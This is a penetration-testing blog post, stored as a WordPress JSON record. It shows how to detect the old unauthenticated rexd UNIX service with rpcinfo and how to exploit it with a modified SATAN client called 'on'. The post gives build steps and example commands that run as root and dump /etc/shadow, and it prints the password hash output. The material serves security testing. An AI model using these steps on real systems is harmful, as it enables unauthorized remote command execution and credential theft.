{"id":70,"date":"2008-10-23T22:24:23","date_gmt":"2008-10-23T22:24:23","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=70"},"modified":"2011-11-10T21:37:09","modified_gmt":"2011-11-10T21:37:09","slug":"rexd-client-for-linux","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/rexd-client-for-linux","title":{"rendered":"Rexd Client For Linux"},"content":{"rendered":"<p>I recently encountered the <a href=\"http:\/\/docs.sun.com\/app\/docs\/doc\/816-5212\/6mbcdgk7r?a=view\">rexd<\/a> service running on a host I was testing.\u00a0 This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).\u00a0 It&#8217;s <a href=\"http:\/\/www.porcupine.org\/satan\/demo\/tutorials\/vulnerability\/REXD_access.html\">well know<\/a> that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with no authentication.<\/p>\n<p>This post briefly covers how to identify the service and how to exploit it.\u00a0 I&#8217;ve also modified the rexd client from SATAN to compile cleanly on Linux (download link below&#8230;).<\/p>\n<p>&nbsp;<\/p>\n<p><!--more--><\/p>\n<h3>Identifying Hosts Running Rexd<\/h3>\n<p>Use rpcinfo to check the RPC service running on the target host (assuming the portmapper is running &#8211; 111\/TCP).\u00a0 If rexd is listed, you&#8217;re in luck:<\/p>\n<pre>$ rpcinfo -p 10.0.0.1\r\n\u00a0\u00a0 program vers proto\u00a0\u00a0 port\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 4\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 3\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 2\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 4\u00a0\u00a0 udp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 3\u00a0\u00a0 udp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 2\u00a0\u00a0 udp\u00a0\u00a0\u00a0 111\u00a0 rpcbind\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100229\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0 32795\u00a0 metad\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100229\u00a0\u00a0\u00a0 2\u00a0\u00a0 tcp\u00a0 32795\u00a0 metad\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100230\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0 32796\u00a0 metamhd\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100242\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0 32797\u00a0 rpc.metamedd\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0 100017\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0 32798\u00a0 rexd\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 &lt;---   :-)\r\n...<\/pre>\n<h3>Exploitation<\/h3>\n<p>Exploitation is a simple as finding a client and running it.\u00a0 Solaris hosts usually have the client &#8220;on&#8221; installed by default.\u00a0 If you&#8217;ve got a Solaris VM, or you&#8217;ve already broken into another Solaris machine during your pentest, you can probably use that.<\/p>\n<p>Alternatively, if you&#8217;d prefer a Linux client, it seems you&#8217;re out of luck.\u00a0 Modern distros don&#8217;t seem to have such a client (I checked Gentoo and Debian).\u00a0 SATAN (an old-school pentesting toolkit) has one which I modified to compile cleanly and be a bit easier to use.\u00a0 <a href=\"http:\/\/www.pentestmonkey.net\/tools\/on\/on.tar.gz\">Download my modified rexd client here<\/a>.<\/p>\n<p><em>Update: 2011-11 Thanks to Hank Leininger for the patch. Now supports -p arg.<\/em><\/p>\n<p>To compile \/ install:<\/p>\n<pre>$ tar xfz on.tar.gz\r\n$ cd on\r\n$ make\r\n$ sudo make install<\/pre>\n<p>Help message:<\/p>\n<pre>$ on\r\nUsage: on [ -u uid ] [ -g gid ] [ -h hostname ] ip command...\r\nExamples:\r\n\u00a0\u00a0\u00a0 on 10.0.0.1 cat \/etc\/shadow\r\n\u00a0\u00a0\u00a0 on 10.0.0.1 -u 1 10.0.0.1 id\r\n\r\non is a client for rexd, the Remote Execution Daemon.\u00a0 To check if a target\r\nis running rexd, do 'rpcinfo -p ip' and check for rexd (program number 100017).\r\n\r\nIf rexd is running on the target you should be able to execute commands on the\r\nremote host as any user you like.\r\n\r\nThis program is a minor modification of 'rex' by Wietse Venema, part of SATAN:\r\nhttp:\/\/www.porcupine.org\/satan\/mirrors.html<\/pre>\n<p>To run:<\/p>\n<pre>$ on 10.0.0.1 id\r\nuid=0(root) gid=0(root)\r\n$ on -u 1 -g 2 10.0.0.1 id\r\nuid=1(daemon) gid=2(bin)\r\n$ on 10.0.0.1 cat \/etc\/shadow\r\nroot:.VLpoFoQoa8eY:14175::::::\r\ndaemon:NP:6445::::::\r\nbin:NP:6445::::::\r\n...<\/pre>\n<p>&nbsp;<\/p>\n","protected":false},"excerpt":{"rendered":"<p>I recently encountered the rexd service running on a host I was testing.\u00a0 This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).\u00a0 It&#8217;s well know that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[75,19,77],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/70"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=70"}],"version-history":[{"count":4,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/70\/revisions"}],"predecessor-version":[{"id":649,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/70\/revisions\/649"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=70"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=70"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=70"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}